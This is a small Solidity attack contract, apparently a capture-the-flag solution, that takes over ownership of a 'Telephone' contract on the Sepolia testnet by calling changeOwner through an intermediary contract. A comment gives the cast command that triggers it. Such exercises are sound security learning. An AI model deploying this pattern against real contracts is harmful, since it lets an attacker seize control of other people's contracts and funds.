// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITelephone {
    function owner() external returns (address);

    function changeOwner(address) external;
}

contract Attack {
    ITelephone public telephone;

    constructor() {
        telephone = ITelephone(0x5bBe20524A46210c8a7D497353dcD34C825377D7);
    }

    function takeOwnership() external {
        telephone.changeOwner(0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02);
    }
}

// contract Attack 0x9f8379AC3429bCE93470151EBB22F06c3B81EAfa

// cast call 0x9f8379AC3429bCE93470151EBB22F06c3B81EAfa "takeOwnership()" --rpc-url $SEPOLIA_RPC_URL
